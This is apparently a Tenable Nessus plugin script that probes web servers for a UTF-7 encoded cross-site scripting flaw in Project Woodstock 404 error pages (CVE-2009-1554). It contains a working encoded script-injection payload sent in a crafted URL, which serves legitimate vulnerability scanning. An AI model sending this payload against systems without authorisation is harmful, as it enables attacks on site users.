#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(38733);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/05/04 18:02:23 $");

  script_cve_id("CVE-2009-1554");
  script_bugtraq_id(34829,34914);
  script_osvdb_id(54220);
  script_xref(name:"Secunia", value:"35006");

  script_name(english:"Project Woodstock 404 Error Page UTF-7 Encoded XSS");
  script_summary(english:"Checks for XSS vulnerability in 404 error page");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a web application that is affected by
a cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server contains a web application built using Woodstock
components, which are user interface components for the web- based on
Java Server Faces and AJAX. Woodstock is part of Sun Glassfish
Enterprise Server and can also be used with other Java web containers,
such as JBoss, Tomcat, and WebLogic.

The version of Woodstock in use fails to properly sanitize user-
supplied URI data when generating 404 error page. By sending UTF-7
encoded URIs to the affected application, an attacker could launch
cross-site scripting attacks.

Note that this attack only works if the victim configures their
browser to auto-detect encoding, and the browser recognizes UTF-7.");
  script_set_attribute(attribute:"see_also", value:"http://dsecrg.com/pages/vul/show.php?id=138");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/503239/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://woodstock.dev.java.net/servlets/ReadMsg?list=cvs&msgNo=4041");
  script_set_attribute(attribute:"solution", value:"Download the latest Woodstock sources from CVS.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/05/11");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 8080, 4848);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:8080);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Test for the XSS vulnerability
xss_params = '+ACJ-+AD4APB-SCRIPT+AD7-alert(+ACI-Nessus+ACI-)+ADz-/SCRIPT+AD7-';

url = string("/theme/META-INF/", xss_params);

res = http_send_recv3(method:"GET", item:url, port:port, fetch404:TRUE);
if (isnull(res)) exit(0);

# Make sure the XSS is in the response code
if ( strcat("HTTP/1.1 404 ", url) >!< res[0] ) exit(0);

if (
    string(">HTTP Status 404 - ", url, "</h") >< res[2] ||
    string("Status report</p><p><b>message</b>", url, "</p>") >< res[2]
  )
  {
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
}
